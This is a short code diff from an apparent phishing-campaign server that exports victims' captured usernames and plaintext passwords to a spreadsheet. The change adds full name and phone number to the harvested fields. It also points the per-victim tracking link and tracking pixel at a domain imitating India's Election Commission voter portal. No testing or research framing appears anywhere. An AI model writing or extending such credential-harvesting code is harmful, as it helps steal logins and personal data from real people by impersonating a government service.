@@ -390,15 +390,15 @@ app.get('/download-users-excel/:campaignNo', async (req, res) => {
                     `Usernames: ${user.submittedContent.map(data => data.username)} Passwords: ${user.submittedContent.map(data => data.password)},` :
                     (user.submittedContent.length > 0 ?
                         user.submittedContent.map(data => {
-                            let content = `Username: ${data.username}\nPassword: ${data.password}\nCategory: ${data.category}`;
+                            let content = `Username: ${data.username}\nPassword: ${data.password}\nCategory: ${data.category}\nfull Name: ${data.name}\nphone: ${data.phone}`;
                             if (data.mobileNo) {
                                 content += `\nMobile No: ${data.mobileNo}`;
                             }
                             return content;
                         }).join("\n") : "Not Submitted"
                     ),
-                UniqueLinkOpen: `https://phishingmails.onrender.com/incrementLinkOpenCount/${user._id}`,
-                UniqueImageOpen: `https://phishingmails.onrender.com/track.gif?userId=${user._id}`,
+                UniqueLinkOpen: `https://svp-eci-indiagov.org/voterportal/${user._id}`,
+                UniqueImageOpen: `https://svp-eci-indiagov.org/track.gif?userId=${user._id}`,
 
 
             });
